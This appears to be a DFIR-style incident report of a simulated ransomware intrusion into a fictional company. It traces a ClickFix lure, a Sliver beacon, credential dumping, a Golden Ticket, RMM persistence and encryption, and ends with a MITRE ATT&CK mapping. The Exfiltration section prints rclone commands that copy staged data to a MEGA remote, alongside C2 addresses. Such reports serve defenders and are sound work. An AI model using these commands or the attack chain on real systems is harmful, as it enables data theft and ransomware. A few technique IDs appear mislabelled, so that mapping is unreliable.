# Simulated-Case-1 - The DFIR Report

> ℹ️ **Info**:  
> All related material and artifacts for this report can be found at [The DFIR Report GitHub](https://github.com/The-DFIR-Report/DFIR-Artifacts).

## Case Summary

The compromise of StarkTech’s internal network began when a user on desktop6 was lured into a ClickFix-style social engineering trap. These campaigns are known for delivering heavily obfuscated PowerShell payloads via misleading web content. Upon execution, the PowerShell code downloaded and ran a Sliver command-and-control beacon (`iexploreplugin.exe`), which immediately established an outbound connection to a remote attacker-controlled server.

Initial reconnaissance from desktop6 included local and domain enumeration of users, groups, shared resources, and administrative memberships. These actions were performed using native system utilities. To avoid detection, the Sliver beacon injected into `notepad.exe`, which was then used to launch enumeration tools such as BloodHound. Collected Active Directory intelligence—including user and group relationships, GPOs, containers, and domains—was stored in multiple JSON files and archived into a ZIP file on disk.

The attacker elevated privileges by injecting `iexploreplugin.exe` into the trusted `spoolsv.exe` process. This allowed access to `lsass.exe` memory space, from which sensitive credentials were extracted, including NTLM hashes and Kerberos tickets. These credentials enabled SYSTEM-level access and the ability to spawn new Sliver beacons with administrative rights.

Persistence was achieved by placing malicious shortcuts in the startup folder and modifying registry Run keys. With valid credentials and elevated access, the attacker moved laterally across the network. RPC-based command execution was used to reach `files5`, where remote procedures triggered system commands and PowerShell scripts. A SYSTEM shell was established via a network logon using the compromised `admin143` account.

On `files5`, the attacker executed remote PowerShell commands to download and run an Impacket-embedded Python archive (`python.zip`) via `pythonw.exe`. Windows Defender was disabled to allow unrestricted post-exploitation activity. Memory dumping was performed using DumpIt, likely to harvest additional credentials and tokens for privilege escalation or persistence.

Lateral movement continued as the attacker enumerated session data and user activity on systems including `SERVER4`, `LAPTOP5`, `BACKUP3`, and `EXCHANGE`. Group Policy templates were accessed, security configurations reviewed, and TGS tickets extracted to support potential Pass-the-Ticket operations.

On `dc1`, the attacker executed a DCSync attack to extract credential material directly from Active Directory, using `ntdsutil` and `mimikatz` to dump sensitive databases and secrets. A Golden Ticket was forged for the `krbtgt` account, granting the attacker persistent, stealthy access across the domain without relying on stolen credentials.

To maintain remote access, the attacker silently deployed Atera RMM, AnyDesk, and a Splashtop agent, all configured to automatically reconnect. A firewall rule was removed to allow unrestricted inbound connections.

The attacker then downloaded `rclone` on `files5` and a tailored configuration file to exfiltrate the stolen archive to Mega cloud storage (`mega.co.nz`), effectively removing confidential data from the environment. Antivirus was disabled via PowerShell to avoid interference, and behavior monitoring was turned off to ensure uninterrupted data staging and movement.

In the final stage, ransomware payloads were deployed simultaneously across `FILES5`, `DC1`, `EXCHANGE`, `SERVER8`, and `LAPTOP5` using remote PowerShell execution. Scripts (`script.ps1`, `crypto.psm1`) encrypted all accessible user and system data, locking files and halting operations across key systems.

This operation illustrates a comprehensive attack lifecycle—from initial access via social engineering to domain dominance and data encryption—leveraging credential theft, RPC-based remote execution, stealthy persistence, and exfiltration via public cloud services. The attacker demonstrated strong operational discipline and deep familiarity with Windows enterprise environments.

## Initial Access

The intrusion began on March 25, 2025, when a user on desktop6 visited a malicious Paste.sh URL hosting base64-encoded PowerShell tied to ClickFix-style social engineering campaigns. Shortly after, a RunMRU registry key was created, indicating the user executed a command via the Windows Run dialog—commonly leveraged in these attacks. This triggered PowerShell to download and execute a Sliver beacon (`iexploreplugin.exe`) from `http://34.29.169.45:8883`, which immediately established C2 communication.

![ClickFix Campaign](/posts/dfir_simulated-case-1/images/clickfix.png "ClickFix Campaign")

## Execution

The attacker leveraged various execution techniques, including PowerShell scripts, to initiate malicious processes. They executed the `iexploreplugin.exe` beacon via PowerShell, enabling command-and-control communication. WMI was used to remotely execute commands and deploy additional payloads, while process injection allowed the execution of malicious code within legitimate system processes, such as `svchost.exe`. To maintain persistence, the attacker utilized scheduled tasks and registry modifications, ensuring that the payloads were executed after system reboots or logins. The use of legitimate administrative tools, like `cmd.exe` and PowerShell, further facilitated lateral movement and code execution across systems.

![Execution](/posts/dfir_simulated-case-1/images/exec.png "Execution")

## Persistence

The threat actor created multiple registry-based Run keys to ensure the automatic execution of malicious payloads on user login. This included entries pointing to the Sliver beacon (`iexploreplugin.exe`) and a renamed dotnet binary (`dotnet-runtime-8.0.11-win-x64.exe`), allowing re-establishment of access after reboot.

Persistence was also maintained via the Startup folder. Shortcuts to `iexploreplugin.exe` and AnyDesk were dropped into the `C:\Users\Public\Startup\` directory, ensuring that these payloads would launch automatically at user logon.

To maintain long-term access, the attacker silently installed Atera RMM via a custom MSI. The agent was configured for automatic restart and connected to `20.37.139.187`. Additionally, a Splashtop agent bundled with the installer was deployed and connected to `st2-v3-dc.splashtop.com`.

At 21:05:30 on March 25, the threat actor forged a Kerberos Golden Ticket for the `krbtgt` account in the `STARKTECH.LOCAL` domain. This granted indefinite, domain-wide persistence without needing valid credentials, effectively bypassing authentication controls.

![Persistence](/posts/dfir_simulated-case-1/images/exec.png "Persistence")

## Privilege Escalation

The attacker escalated privileges by injecting the Sliver beacon (`iexploreplugin.exe`) into the `spoolsv.exe` process, which was already running with higher system privileges. This enabled the attacker to gain elevated access to the system and execute further malicious activities under a privileged context.

After gaining elevated privileges, the attacker accessed `lsass.exe`, the Local Security Authority Subsystem Service, to dump credentials. This technique allowed the attacker to extract additional credentials from memory, further compromising the environment.

## Defense Evasion

The attacker used several techniques to evade detection and maintain persistence within the network. To disable Windows Defender, they modified system settings and registry entries, turning off real-time protection to avoid detection of malicious activities. This was accomplished through PowerShell scripts that disabled monitoring features.

The attacker masqueraded their malicious files by using names and icons similar to legitimate Windows components, further reducing the chances of detection.

To cover their tracks, the attacker deleted logs and other traces of their activities, ensuring that security teams would have difficulty finding evidence of their presence. These methods allowed the attacker to operate covertly and maintain control over the compromised systems.

![Defense Evasion](/posts/dfir_simulated-case-1/images/def.png "Defense Evasion")

## Credential Access

The attacker escalated privileges by injecting `iexploreplugin.exe` into the `spoolsv.exe` process, which was running with elevated privileges. This action granted the attacker full access rights (`0x1FFFFF`) to `spoolsv.exe`, indicating a probable code injection. Using this elevated access, the `spoolsv.exe` process was able to interact with `LSASS.exe` and dump credentials from memory. The access permissions of `0x1010` indicated that `spoolsv.exe` was able to read LSASS memory, facilitating credential theft.

![Credential Access](/posts/dfir_simulated-case-1/images/cred.png "Credential Access")

## Discovery

The attacker initiated discovery through reconnaissance on `desktop6`, starting with the collection of domain information after accessing various network services. The attacker requested Kerberos service tickets for LDAP, CIFS, and HOST services, indicating possession of valid domain credentials. Following this, the attacker accessed a Group Policy Preferences registry file, potentially extracting plaintext credentials. Domain enumeration was performed through DRSBind and DRSCrackNames requests, revealing domain structure and user objects.

The attacker also leveraged BloodHound for Active Directory enumeration, gathering information about group memberships and permissions, which was stored locally on the compromised system. They utilized commands like `whoami`, `net localgroup administrators`, and `net group "Domain Users" /domain` to confirm administrative access. Additional domain exploration occurred through the exchange of RPC replication traffic between domain controllers, potentially exfiltrating Active Directory data, including NTLM password hashes.

Lateral movement was observed as the attacker enumerated remote session information across multiple systems, accessing various GPO files and security settings. They further exploited remote service discovery, enabling services such as `RemoteRegistry` on `files5`, and used PowerShell and WMI for remote execution. A DumpIt memory dump was created on `files5` for credential harvesting, and registry entries were modified to establish persistence through autorun mechanisms.

By the end of the discovery phase, the attacker had identified critical network resources, escalated privileges, and enumerated multiple systems for further exploitation.

![Discovery](/posts/dfir_simulated-case-1/images/disco.png "Discovery")

## Lateral Movement

RDP was used by `admin143` to access multiple systems, including `files5` and `dc1`, leveraging Fast User Switching to resume existing sessions. This enabled file exploration and the retrieval of sensitive documents. Connections were made from IP addresses `10.135.85.21` to `10.135.85.15`, with another session likely set up to maintain access. Shared file access was also observed, including documents like `File01152021.pdf` and others in shared directories.

WinRM facilitated remote code execution. The attacker initiated a PowerShell session from the file server to a domain controller, executing Active Directory discovery commands, logged in PowerShell event IDs 4103 and 4104. This enabled further exploitation of the environment.

WMI was used for remote code execution and persistence. The attacker executed commands like downloading malicious files via PowerShell, using `cmd.exe` to redirect output to a remote location. Microsoft Defender flagged these actions as malicious, with the attacker disabling real-time monitoring and expanding the downloaded files to maintain persistence.

SMB was leveraged for lateral movement and credential theft. The attacker enumerated SMB shares on `files5` to access sensitive files, including PDFs and Excel documents, furthering their foothold within the network.

![Lateral Movement](/posts/dfir_simulated-case-1/images/lat.png "Lateral Movement")

## Command and Control

The initial command and control (C2) channel was established through a Sliver beacon that communicated with `34.29.169.45`, triggered by the execution of `iexploreplugin.exe`. During the intrusion, process injection was detected, with the attacker targeting legitimate system processes like `svchost.exe`. This injection enabled the execution of malicious code within trusted processes, allowing the attacker to remain undetected. C2 communication persisted throughout the duration of the attack.

![Command and Control](/posts/dfir_simulated-case-1/images/c2.png "Command and Control")

## Exfiltration

The attacker shifted tactics and utilized Rclone’s MEGA integration to exfiltrate data to Mega.io. The following command was executed during the exfiltration process:

```powershell
"C:\Users\Public\rclone+config\rclone.exe" copy C:\ProgramData\Teams mega:V1A
"C:\Users\Public\rclone+config\rclone.exe" copy C:\ProgramData\Microsoft\Teams mega:V1A
```

The data was transferred to the domain `gfs214n181.userstorage.mega.co.nz`.

![Exfiltration](/posts/dfir_simulated-case-1/images/exf.png "Exfiltration")

## Impact

The attacker gained full domain control, accessing and exfiltrating sensitive data such as HR and financial files. Active Directory data and NTLM password hashes were extracted, enabling persistent access and lateral movement across the environment.

In the final phase of the intrusion, ransomware was deployed across multiple systems, including `LAPTOP5`, `SERVER8`, `FILES5`, `EXCHANGE`, and `DC1`. This resulted in the encryption of all accessible files, effectively rendering critical business data and systems unusable. Combined with the use of remote access tools like AnyDesk, Atera RMM, and Splashtop, the attacker ensured continued access while maximizing operational disruption. The encryption caused major outages and data unavailability, impacting business continuity and recovery efforts.

## MITRE ATT&CK

**Initial Access**

- Phishing (T1566)

**Execution**

- PowerShell (T1059.001)
- Windows Command Shell (T1059.003)
- Windows Management Instrumentation (T1047)
- Remote Service Session Hijacking (T1569.002)
- User Execution: Malicious File (T1204.002)

**Persistence**

- Registry Run Keys / Startup Folder (T1547.001)
- Remote Access Tools (T1219)
- Windows Service (T1543.003)

**Privilege Escalation**

- Process Injection (T1055)
- Credential Dumping (T1003)

**Defense Evasion**

- Masquerading (T1036)
- Disable or Modify Tools (T1562)

**Credential Access**

- Credentials in Files (T1552.001)
- LSASS Memory (T1003.001)

**Discovery**

- Domain Trust Discovery (T1482)
- Permission Groups Discovery: Domain Groups (T1069.002)
- Remote System Discovery (T1018)
- Security Software Discovery (T1518.001)
- System Service Discovery (T1007)
- Process Discovery (T1057)
- User Account Discovery: Domain Account (T1087.002)

**Lateral Movement**

- Remote Desktop Protocol (RDP) (T1076)
- Windows Management Instrumentation (WMI) (T1047)

**Collection**

**Command and Control**

- Proxy (T1090)
- Web Protocols: HTTP/S (T1071.001)

**Exfiltration**

- Exfiltration Over Alternative Protocol (T1048)
- Exfiltration to Cloud Storage (T1567.002)

**Impact**

- Data Encrypted for Impact (T1486)
